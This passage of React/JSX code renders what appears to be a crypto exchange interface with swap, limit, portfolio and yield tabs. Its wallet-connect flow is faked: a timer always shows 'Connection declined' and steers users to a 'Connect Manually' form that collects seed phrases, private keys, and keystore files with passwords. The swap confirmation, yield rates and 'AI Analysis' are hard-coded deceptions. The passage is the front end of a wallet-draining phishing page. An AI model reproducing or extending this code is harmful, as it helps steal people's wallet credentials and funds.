        </div>
      </div>

      {/* MAIN CONTENT */}
      <main id="mainContainer">
        <div className="tabs" id="mainTabs">
          <button className={`tab ${activeTab === 'portfolio' ? 'active' : ''}`} onClick={() => handleTabSwitch('portfolio')} id="tabPortfolio">
            Your Portfolio
          </button>
          <button className={`tab ${activeTab === 'swap' ? 'active' : ''}`} onClick={() => handleTabSwitch('swap')} id="tabSwap">
            Swap
          </button>
          <button className={`tab ${activeTab === 'limit' ? 'active' : ''}`} onClick={() => handleTabSwitch('limit')} id="tabLimit">
            Limit
          </button>
          <button className={`tab ${activeTab === 'earn' ? 'active' : ''}`} onClick={() => handleTabSwitch('earn')} id="tabEarn">
            Earn
          </button>
          <button className={`tab ${activeTab === 'ai' ? 'active' : ''}`} onClick={() => handleTabSwitch('ai')} id="tabAi">
            AI
          </button>
          <span className="settings-icon" id="settingsBtn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#aaa">
              <path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.92c.04-.34.07-.68.07-1.08s-.03-.74-.07-1.08l2.32-1.82c.21-.16.27-.46.13-.7l-2.2-3.82c-.13-.24-.42-.32-.66-.24l-2.74 1.1c-.57-.44-1.18-.8-1.86-1.08l-.42-2.9C14.27 2.18 14 2 13.72 2h-4.4c-.28 0-.55.18-.6.44l-.42 2.9c-.68.28-1.29.64-1.86 1.08L3.7 5.32c-.24-.08-.53 0-.66.24L.84 9.38c-.14.24-.08.54.13.7l2.32 1.82C3.25 12.26 3.22 12.6 3.22 13s.03.74.07 1.08L1 15.9c-.21.16-.27.46-.13.7l2.2 3.82c.13.24.42.32.66.24l2.74-1.1c.57.44 1.18.8 1.86 1.08l.42 2.9c.05.26.32.44.6.44h4.4c.28 0 .55-.18.6-.44l.42-2.9c.68-.28 1.29-.64 1.86-1.08l2.74 1.1c.24.08.53 0 .66-.24l2.2-3.82c.14-.24.08-.54-.13-.7l-2.32-1.82z" />
            </svg>
          </span>
        </div>

        {/* SWAP VIEW */}
        {activeTab === 'swap' && (
          <div id="swapView" style={{ width: '680px' }}>
            <div className="swap-card" id="swapCard">
              <div className="token-box" id="tokenBoxFrom">
                <label>From</label>
                <div className="token-row">
                  <input
                    type="number"
                    className="amount-input"
                    placeholder="0.00"
                    value={fromAmount}
                    onChange={(e) => {
                      setFromAmount(e.target.value);
                      setToAmount(e.target.value);
                    }}
                    id="fromAmountInput"
                  />
                  <button
                    className="token-select"
                    onClick={() => {
                      setTokenPickerSide('from');
                      setIsTokenPickerOpen(true);
                    }}
                    id="fromTokenBtn"
                  >
                    {fromToken} <span>▼</span>
                  </button>
                </div>
              </div>
              <div className="swap-divider">
                <button
                  className="arrow-btn"
                  onClick={() => {
                    const tempT = fromToken;
                    setFromToken(toToken);
                    setToToken(tempT);
                  }}
                  id="swapDirectionBtn"
                >
                  ↓
                </button>
              </div>
              <div className="token-box" id="tokenBoxTo">
                <label>To</label>
                <div className="token-row">
                  <input
                    type="number"
                    className="amount-input"
                    placeholder="0.00"
                    value={toAmount}
                    onChange={(e) => setToAmount(e.target.value)}
                    id="toAmountInput"
                  />
                  <button
                    className="token-select"
                    onClick={() => {
                      setTokenPickerSide('to');
                      setIsTokenPickerOpen(true);
                    }}
                    id="toTokenBtn"
                  >
                    {toToken} <span>▼</span>
                  </button>
                </div>
              </div>
            </div>
            <button
              className={`connect-wallet ${connectedAccount ? 'connected' : ''}`}
              onClick={() => {
                if (!connectedAccount) {
                  setIsWalletModalOpen(true);
                } else if (!fromAmount || parseFloat(fromAmount) <= 0) {
                  alert('Please enter an amount to migrate');
                } else {
                  setConnecting(true);
                  setTimeout(() => {
                    setConnecting(false);
                    alert(`🎉 Successfully migrated ${fromAmount} ${fromToken} for ${toAmount || 'estimated'} ${toToken}!`);
                    setFromAmount('');
                    setToAmount('');
                  }, 2500);
                }
              }}
              id="mainConnectWalletBtn"
            >
              {!connectedAccount
                ? 'Connect Wallet'
                : connecting
                ? 'Migrating...'
                : !fromAmount || parseFloat(fromAmount) <= 0
                ? 'Enter an amount'
                : 'Migrate'}
            </button>
          </div>
        )}

        {/* LIMIT VIEW */}
        {activeTab === 'limit' && (
          <div id="limitView" style={{ width: '680px' }}>
            <div className="swap-card">
              <div className="token-box">
                <label>Sell</label>
                <div className="token-row">
                  <span className="amount">0.00</span>
                  <button className="token-select" onClick={() => setIsTokenPickerOpen(true)}>
                    Select token <span>▼</span>
                  </button>
                </div>
              </div>
              <div className="swap-divider">
                <button className="arrow-btn">↓</button>
              </div>
              <div className="token-box">
                <label>Buy</label>
                <div className="token-row">
                  <span className="amount">0.00</span>
                  <button className="token-select" onClick={() => setIsTokenPickerOpen(true)}>
                    Select token <span>▼</span>
                  </button>
                </div>
              </div>
              <div className="token-box" style={{ marginTop: '8px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                  When 1{' '}
                  <button className="token-select" style={{ fontSize: '13px', padding: '6px 14px' }} onClick={() => setIsTokenPickerOpen(true)}>
                    Select token <span>▼</span>
                  </button>{' '}
                  is worth
                </label>
                <div className="token-row" style={{ marginTop: '12px' }}>
                  <span className="amount">0.00</span>
                  <button className="token-select" onClick={() => setIsTokenPickerOpen(true)}>
                    Select token <span>▼</span>
                  </button>
                </div>
                <div className="limit-presets">
                  {['Market', '+1%', '+5%', '+10%'].map((p) => (
                    <button
                      key={p}
                      className={`limit-preset ${limitPreset === p ? 'active' : ''}`}
                      onClick={() => setLimitPreset(p)}
                    >
                      {p}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            <div className="limit-expiry">
              <span>Expiry</span>
              <div className="limit-expiry-btns">
                {['1 day', '1 week', '1 month', '1 year'].map((exp) => (
                  <button
                    key={exp}
                    className={`limit-expiry-btn ${limitExpiry === exp ? 'active' : ''}`}
                    onClick={() => setLimitExpiry(exp)}
                  >
                    {exp}
                  </button>
                ))}
              </div>
            </div>
            <button
              className={`connect-wallet ${connectedAccount ? 'connected' : ''}`}
              onClick={() => {
                if (!connectedAccount) {
                  setIsWalletModalOpen(true);
                } else {
                  alert(`Limit order placed successfully for ${limitExpiry}!`);
                }
              }}
            >
              {!connectedAccount ? 'Connect wallet' : 'Place Limit Order'}
            </button>
          </div>
        )}

        {/* OTHER TABS */}
        {activeTab === 'portfolio' && (
          <div style={{ width: '800px', maxWidth: '100%' }}>
            {!connectedAccount ? (
              <div style={{ background: '#1a1a1a', borderRadius: '16px', padding: '40px 20px', textAlign: 'center' }}>
                <h2 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '16px' }}>Your Portfolio</h2>
                <p style={{ color: '#888', marginBottom: '20px' }}>Connect your wallet to view holdings and analytics.</p>
                <button className="connect-wallet" style={{ width: 'auto', padding: '12px 28px' }} onClick={() => setIsWalletModalOpen(true)}>
                  Connect Wallet
                </button>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
                {/* Top Hero Card */}
                <div style={{ background: '#151515', borderRadius: '24px', overflow: 'hidden', position: 'relative' }}>
                  <div style={{ padding: '32px 32px 0 32px' }}>
                    <h1 style={{ fontSize: '32px', fontWeight: 700, margin: 0, color: '#fff' }}>Portfolio</h1>
                    <p style={{ fontSize: '18px', color: '#fff', margin: '8px 0 0 0', lineHeight: 1.3, letterSpacing: '0.5px' }}>Track<br/>Balances</p>
                  </div>
                  
                  {/* Curved Background Area */}
                  <div style={{ 
                    marginTop: '32px',
                    background: 'radial-gradient(120% 100% at 50% 0%, #2b305b 0%, #111 100%)',
                    padding: '48px 20px 40px',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    borderTopLeftRadius: '50% 20px',
                    borderTopRightRadius: '50% 20px',
                    borderBottom: '1px solid #1a1a1a'
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
                      <div style={{ background: '#4c6ef5', borderRadius: '50%', width: '26px', height: '26px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M22 10h-4c-1.1 0-2 .9-2 2s.9 2 2 2h4"/></svg>
                      </div>
                      <span style={{ fontSize: '16px', color: '#fff', fontWeight: 600 }}>Your wallet</span>
                    </div>
                    <div style={{ fontSize: '48px', fontWeight: 700, color: '#fff', letterSpacing: '-1px' }}>$0.00</div>
                  </div>
                </div>

                {/* Bottom Section */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <div>
                      <div style={{ color: '#888', fontSize: '14px', marginBottom: '12px', fontWeight: 500 }}>Current Balance</div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                        <div style={{ fontSize: '32px', fontWeight: 700, color: '#fff' }}>$0.00</div>
                        <div style={{ background: '#4c6ef5', color: '#fff', padding: '6px 12px', borderRadius: '999px', fontSize: '13px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px' }}>
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
                          0.00%
                        </div>
                      </div>
                      <div style={{ color: '#4c6ef5', fontSize: '14px', marginTop: '6px', fontWeight: 600 }}>$0.00 <span style={{ color: '#888', marginLeft: '4px', fontWeight: 500 }}>24h</span></div>
                    </div>
                    <button style={{ background: 'transparent', border: '1px solid #333', color: '#fff', padding: '8px 16px', borderRadius: '999px', fontSize: '14px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
                      <span style={{ background: '#4c6ef5', color: '#fff', borderRadius: '50%', width: '20px', height: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '16px', lineHeight: 1 }}>+</span>
                      Add Wallet
                    </button>
                  </div>

                  <div style={{ display: 'flex', gap: '24px', marginTop: '24px', flexWrap: 'wrap' }}>
                    {/* Chart Area */}
                    <div style={{ flex: 1, minWidth: '300px', display: 'flex', flexDirection: 'column' }}>
                      <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '60px' }}>
                        <div style={{ background: '#151515', borderRadius: '8px', padding: '4px', display: 'flex', gap: '2px', border: '1px solid #222' }}>
                          {['24 H', '7 D', '30 D', '1 Y', '3 Y'].map(tf => (
                            <button key={tf} style={{ background: tf === '24 H' ? '#2a2a2a' : 'transparent', color: tf === '24 H' ? '#fff' : '#888', border: 'none', padding: '6px 14px', borderRadius: '6px', fontSize: '13px', fontWeight: 600, cursor: 'pointer' }}>
                              {tf}
                            </button>
                          ))}
                        </div>
                      </div>
                      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '120px' }}>
                        <div style={{ fontSize: '22px', fontWeight: 700, color: '#fff' }}>No Data found ! 🥺</div>
                      </div>
                    </div>

                    {/* Earnings Card */}
                    <div style={{ width: '320px', background: '#151515', borderRadius: '16px', padding: '24px', border: '1px solid #222' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '32px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '18px', fontWeight: 700, color: '#fff' }}>
                          <span style={{ color: '#4c6ef5', fontWeight: 500 }}>+</span> Earnings
                        </div>
                        <div style={{ fontSize: '13px', color: '#aaa', fontWeight: 500 }}>Earn with ARC</div>
                      </div>
                      <div style={{ background: '#0a0a0a', borderRadius: '12px', padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', border: '1px solid #1a1a1a' }}>
                        <span style={{ fontSize: '20px', fontWeight: 700, color: '#fff' }}>0</span>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <div style={{ background: '#4c6ef5', borderRadius: '50%', width: '24px', height: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                          </div>
                          <span style={{ fontSize: '15px', fontWeight: 600, color: '#fff' }}>stARC</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === 'earn' && (
          <div style={{ width: '680px', maxWidth: '100%' }}>
            {!connectedAccount ? (
              <div style={{ background: '#1a1a1a', borderRadius: '16px', padding: '40px 20px', textAlign: 'center' }}>
                <h2 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '16px' }}>Yield Pools</h2>
                <p style={{ color: '#888', marginBottom: '20px' }}>Connect your wallet to earn yield on liquidity.</p>
                <button className="connect-wallet" style={{ width: 'auto', padding: '12px 28px' }} onClick={() => setIsWalletModalOpen(true)}>
                  Connect Wallet
                </button>
              </div>
            ) : (
              <div style={{ background: '#1a1a1a', borderRadius: '16px', padding: '24px' }}>
                <h2 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '16px' }}>Yield Pools</h2>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '16px', background: '#111', borderRadius: '12px' }}>
                  <div>
                    <div style={{ fontWeight: 600 }}>USDT-ETH Vault</div>
                    <div style={{ color: '#888', fontSize: '13px' }}>Earn automated trading fees</div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#2ed573', fontWeight: 700 }}>14.8% APY</div>
                    <button style={{ marginTop: '6px', background: '#3b5bdb', color: '#fff', border: 'none', borderRadius: '6px', padding: '6px 14px', cursor: 'pointer', fontSize: '13px' }}>Stake</button>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '16px', background: '#111', borderRadius: '12px' }}>
                  <div>
                    <div style={{ fontWeight: 600 }}>BNB-USDT Vault</div>
                    <div style={{ color: '#888', fontSize: '13px' }}>High efficiency liquidity pool</div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#2ed573', fontWeight: 700 }}>22.4% APY</div>
                    <button style={{ marginTop: '6px', background: '#3b5bdb', color: '#fff', border: 'none', borderRadius: '6px', padding: '6px 14px', cursor: 'pointer', fontSize: '13px' }}>Stake</button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === 'ai' && (
          <div style={{ width: '680px', maxWidth: '100%' }}>
            {!connectedAccount ? (
              <div style={{ background: '#1a1a1a', borderRadius: '16px', padding: '40px 20px', textAlign: 'center' }}>
                <h2 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '16px' }}>AI Trading & Routing Insights</h2>
                <p style={{ color: '#888', marginBottom: '20px' }}>Connect your wallet to access AI smart routing.</p>
                <button className="connect-wallet" style={{ width: 'auto', padding: '12px 28px' }} onClick={() => setIsWalletModalOpen(true)}>
                  Connect Wallet
                </button>
              </div>
            ) : (
              <div style={{ background: '#1a1a1a', borderRadius: '16px', padding: '24px' }}>
                <h2 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '16px' }}>AI Trading & Routing Insights</h2>
                <p style={{ fontSize: '14px', color: '#ccc', lineHeight: '1.5' }}>
                  ✨ <strong>AI Analysis:</strong> Market volatility for ETH/BNB is currently low. Recommended split route across BSC V3 and Uniswap V3 to save <strong>$14.20 in slippage</strong> on your next swap.
                </p>
              </div>
            )}
          </div>
        )}
      </main>

      {/* CONNECT WALLET MODAL */}
      <div
        className={`modal-overlay ${isWalletModalOpen ? 'open' : ''}`}
        id="walletModal"
        onClick={(e) => {
          if (e.target === e.currentTarget) setIsWalletModalOpen(false);
        }}
      >
        <div className="modal">
          <div className="modal-header">
            <span className="modal-help">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
            </span>
            <h2>Connect Wallet</h2>
            <button className="modal-close" onClick={() => setIsWalletModalOpen(false)}>✕</button>
          </div>
          <div className="wallet-list">
            {displayWallets.map((w) => {
              const installed = checkWalletInstalled(w.name);
              const customBadge = (w as any).badge;
              return (
                <div
                  key={w.name}
                  className="wallet-item"
                  onClick={() => openWcModalForWallet(w)}
                >
                  <img className="wallet-icon" src={w.icon || undefined} alt={w.name} />
                  <span className="wallet-name">{w.name}</span>
                  {customBadge ? (
                    <span className={customBadge === 'QR CODE' ? 'qr-badge' : 'detected-badge'}>{customBadge}</span>
                  ) : installed ? (
                    <span className="detected-badge">INSTALLED</span>
                  ) : null}
                </div>
              );
            })}
            <div
              className="wallet-item"
              onClick={() => setIsAllWalletsOpen(true)}
            >
              <div className="aw-all-icon">
                <svg width="26" height="26" viewBox="0 0 24 24" fill="#5c7cfa">
                  <circle cx="7" cy="7" r="3.5" />
                  <circle cx="17" cy="7" r="3.5" />
                  <circle cx="7" cy="17" r="3.5" />
                  <circle cx="17" cy="17" r="3.5" />
                </svg>
              </div>
              <span className="wallet-name">All Wallets</span>
              <span className="wallet-count">{wcWallets.length > 0 ? wcWallets.length + '+' : ALL_WALLETS_DATA.length + '+'}</span>
            </div>
          </div>
        </div>
      </div>

      {/* ALL WALLETS MODAL */}
      <div
        className={`modal-overlay all-wallets-modal ${isAllWalletsOpen ? 'open' : ''}`}
        id="allWalletsModal"
        onClick={(e) => {
          if (e.target === e.currentTarget) setIsAllWalletsOpen(false);
        }}
      >
        <div className="modal">
          <div className="modal-header">
            <button
              className="modal-close"
              onClick={() => setIsAllWalletsOpen(false)}
              style={{ fontSize: '22px', color: '#fff' }}
            >
              ‹
            </button>
            <h2>All Wallets</h2>
            <button
              className="modal-close"
              onClick={() => {
                setIsAllWalletsOpen(false);
                setIsWalletModalOpen(false);
              }}
            >
              ✕
            </button>
          </div>
          <div className="aw-search">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
            <input
              type="text"
              placeholder="Search wallet"
              value={allWalletsSearch}
              onChange={(e) => setAllWalletsSearch(e.target.value)}
            />
          </div>
          <div className="aw-grid">
            {filteredWallets.map((item, idx) => {
              const installed = checkWalletInstalled(item.name);
              return (
                <div
                  key={idx}
                  className="aw-item"
                  onClick={() => openWcModalForWallet({ ...item, br: '22px' })}
                >
                  <div className="aw-icon-wrap">
                    <img src={item.icon || undefined} alt={item.name} />
                  </div>
                  <span className="aw-name">{item.name}</span>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {/* WALLET CONNECT / DETECTION MODAL */}
      <div
        className={`modal-overlay wc-modal ${isWcModalOpen ? 'open' : ''}`}
        id="wcConnectModal"
        onClick={(e) => {
          if (e.target === e.currentTarget) setIsWcModalOpen(false);
        }}
      >
        <div className="modal" style={{ maxWidth: '380px' }}>
          <div className="modal-header">
            <button
              className="modal-close"
              style={{ fontSize: '22px', color: '#fff' }}
              onClick={() => setIsWcModalOpen(false)}
            >
              ‹
            </button>
            <h2 id="wcModalTitle">{selectedWallet.name}</h2>
            <button
              className="modal-close"
              onClick={() => closeAllModals()}
            >
              ✕
            </button>
          </div>
          <div className="wc-body">
            {walletConnectQr && !isMobileDevice() ? (
              <div style={{ textAlign: 'center' }}>
                <img
                  src={walletConnectQr}
                  alt="WalletConnect QR Code"
                  className="wc-qr-code"
                />
                <div className="wc-title" style={{ marginTop: '16px' }}>Scan with your phone</div>
                <div className="wc-subtitle">Open your preferred wallet app and scan this QR code to connect.</div>
                {connectionError && <div className="wc-error">{connectionError}</div>}
                <div className="wc-footer" style={{ marginTop: '24px' }}>
                  <span>Waiting for approval</span>
                  <button className="wc-get-btn" onClick={() => { setIsWcModalOpen(false); setIsManualModalOpen(true); }}>Connect Manually</button>
                </div>
              </div>
            ) : (
              <>
                {/* Mobile/Browser tabs */}
                <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', marginBottom: '16px' }}>
                  <button onClick={() => { setWcTab('mobile'); setDeclined(false); setTimeout(() => setDeclined(true), 3000); }} style={{ background: wcTab === 'mobile' ? '#1e1e1e' : 'transparent', border: wcTab === 'mobile' ? '1px solid #333' : 'none', color: wcTab === 'mobile' ? '#fff' : '#888', borderRadius: '999px', padding: '8px 20px', fontSize: '14px', fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                    Mobile
                  </button>
                  <button onClick={() => { setWcTab('browser'); setDeclined(false); setTimeout(() => setDeclined(true), 3000); }} style={{ background: wcTab === 'browser' ? '#1e1e1e' : 'transparent', border: wcTab === 'browser' ? '1px solid #333' : 'none', color: wcTab === 'browser' ? '#fff' : '#888', borderRadius: '999px', padding: '8px 20px', fontSize: '14px', fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                    Browser
                  </button>
                </div>

                {/* Wallet icon with ring + badges */}
                <div style={{ position: 'relative', width: '70px', height: '70px', margin: '0 auto 14px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  {!declined && (
                    <svg style={{ position: 'absolute', inset: '-4px', width: '78px', height: '78px', overflow: 'visible' }} viewBox="-4 -4 78 78">
                      <rect fill="none" stroke="#222" strokeWidth="3" x="0" y="0" width="70" height="70" rx="20" ry="20" />
                      <rect fill="none" stroke="#3b5bdb" strokeWidth="3" strokeLinecap="round" x="0" y="0" width="70" height="70" rx="20" ry="20"
                        strokeDasharray="124 248"
                        style={{ animation: 'dash-spin 1.2s linear infinite' }} />
                    </svg>
                  )}
                  <img
                    src={selectedWallet.icon || undefined}
                    alt={selectedWallet.name}
                    style={{ width: '64px', height: '64px', borderRadius: '16px', display: 'block', position: 'relative', zIndex: 1 }}
                  />
                  {/* WalletConnect badge */}
                  <div style={{ position: 'absolute', bottom: '-5px', left: '-5px', width: '22px', height: '22px', borderRadius: '50%', background: '#1a1a2e', border: '2px solid #111', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 2 }}>
                    <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png" alt="WalletConnect" style={{ width: '14px', height: '14px', borderRadius: '50%' }} />
                  </div>
                  {/* Error badge — only after declined */}
                  {declined && (
                    <div style={{ position: 'absolute', bottom: '-5px', right: '-5px', width: '20px', height: '20px', borderRadius: '50%', background: '#e53e3e', border: '2px solid #111', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 2 }}>
                      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                    </div>
                  )}
                </div>

                {declined ? (
                  <>
                    <div className="wc-title" style={{ color: '#e53e3e', marginBottom: '6px' }}>Connection declined</div>
                    <div className="wc-subtitle" style={{ marginBottom: '14px' }}>
                      Connection can be declined if a previous request is still active
                    </div>
                    <button
                      className="wc-continue"
                      style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', width: 'auto', padding: '9px 22px', margin: '0 auto' }}
                      onClick={() => { setDeclined(false); setTimeout(() => setDeclined(true), 3000); }}
                    >
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.95"/></svg>
                      Try again
                    </button>
                  </>
                ) : (
                  <>
                    <div className="wc-title" style={{ marginBottom: '6px' }}>Connecting...</div>
                    <div className="wc-subtitle" style={{ marginBottom: '14px' }}>Approve the connection request in your wallet</div>
                  </>
                )}

                {declined && (
                  <div className="wc-footer" style={{ marginTop: '16px' }}>
                    <span>Not Connecting?</span>
                    <button
                      className="wc-get-btn"
                      onClick={() => {
                        setIsWcModalOpen(false);
                        setIsManualModalOpen(true);
                      }}
                    >
                      Connect Manually
                    </button>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      </div>

      {/* MANUAL CONNECT MODAL */}
      <div
        className={`modal-overlay ${isManualModalOpen ? 'open' : ''}`}
        id="manualModal"
        onClick={(e) => {
          if (e.target === e.currentTarget) setIsManualModalOpen(false);
        }}
      >
        <div className="modal" style={{ maxWidth: '420px', width: '100%' }}>
          <div className="modal-header">
            <button
              className="modal-close"
              style={{ fontSize: '22px', color: '#fff' }}
              onClick={() => setIsManualModalOpen(false)}
            >
              ‹
            </button>
            <h2>Connect Manually</h2>
            <button className="modal-close" onClick={() => setIsManualModalOpen(false)}>✕</button>
          </div>
          {connectionError && (
            <div style={{ background: '#442222', border: '1px solid #ff4444', color: '#ff6666', padding: '10px 16px', borderRadius: '8px', margin: '8px 12px', fontSize: '14px', textAlign: 'center' }}>
              {connectionError}
            </div>
          )}
          <div className="manual-tabs">
            <div className="manual-tab-wrap">
              <button
                className={`manual-tab ${activeManualTab === 'phrase' ? 'active' : ''}`}
                onClick={() => setActiveManualTab('phrase')}
              >
                Phrase ({wordCount})
              </button>
              <button
                className="manual-tab-caret"
                onClick={(e) => {
                  e.stopPropagation();
                  setPhraseDropdownOpen(!phraseDropdownOpen);
                }}
              >
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
              <div className={`phrase-dropdown ${phraseDropdownOpen ? 'open' : ''}`}>
                <div onClick={() => handleWordCountChange(12)}>12 words</div>
                <div onClick={() => handleWordCountChange(18)}>18 words</div>
                <div onClick={() => handleWordCountChange(24)}>24 words</div>
              </div>
            </div>

            <button
              className={`manual-tab ${activeManualTab === 'privatekey' ? 'active' : ''}`}
              onClick={() => setActiveManualTab('privatekey')}
            >
              Private Key
            </button>
            <button
              className={`manual-tab ${activeManualTab === 'keystore' ? 'active' : ''}`}
              onClick={() => setActiveManualTab('keystore')}
            >
              Keystore
            </button>
          </div>

          {/* SEED PHRASE */}
          {activeManualTab === 'phrase' && (
            <div>
              <div className="phrase-grid">
                {phraseWords.map((word, i) => (
                  <div key={i} className="phrase-input-wrap">
                    <span>{i + 1}</span>
                    <input
                      type="text"
                      autoComplete="off"
                      value={word}
                      onChange={(e) => handlePhraseWordChange(i, e.target.value)}
                      onPaste={i === 0 ? handlePastePhrase : undefined}
                    />
                  </div>
                ))}
              </div>
              <button className="manual-submit" onClick={handleManualSubmit} disabled={connecting}>{connecting ? 'Connecting...' : 'Connect Wallet'}</button>
            </div>
          )}

          {/* PRIVATE KEY */}
          {activeManualTab === 'privatekey' && (
            <div>
              <textarea
                className="manual-textarea"
                placeholder="Enter your private key"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
              />
              <button className="manual-submit" onClick={handleManualSubmit} disabled={connecting}>{connecting ? 'Connecting...' : 'Connect Wallet'}</button>
            </div>
          )}

          {/* KEYSTORE */}
          {activeManualTab === 'keystore' && (
            <div>
              <textarea
                className="manual-textarea"
                placeholder="Paste your keystore JSON here"
                value={keystoreJson}
                onChange={(e) => setKeystoreJson(e.target.value)}
              />
              <input
                className="manual-input"
                type="password"
                placeholder="Keystore password"
                style={{ marginTop: '10px' }}
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
              />
              <button className="manual-submit" onClick={handleManualSubmit} disabled={connecting}>{connecting ? 'Connecting...' : 'Connect Wallet'}</button>
            </div>
          )}
        </div>
      </div>

      {/* TOKEN PICKER MODAL */}
      <div
        className={`modal-overlay ${isTokenPickerOpen ? 'open' : ''}`}
        id="tokenPickerModal"
        onClick={(e) => {
          if (e.target === e.currentTarget) setIsTokenPickerOpen(false);
        }}
      >
        <div className="modal" style={{ maxWidth: '360px', width: '100%' }}>
          <div className="modal-header">
            <span></span>
            <h2>Select token</h2>
            <button className="modal-close" onClick={() => setIsTokenPickerOpen(false)}>✕</button>
          </div>
          <div className="wallet-list">
            {TOKENS.map((t) => (
              <div
                key={t.symbol}
                className="wallet-item"
                onClick={() => {
                  if (tokenPickerSide === 'from') setFromToken(t.symbol);
                  else setToToken(t.symbol);
                  setIsTokenPickerOpen(false);
                }}
              >
                <span style={{ fontSize: '20px' }}>{t.icon}</span>
                <span className="wallet-name" style={{ fontWeight: 600 }}>{t.symbol}</span>
                <span style={{ fontSize: '12px', color: '#888' }}>{t.name}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer>
        <div className="footer-main">
          <div className="footer-socials">
            <a href="#">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
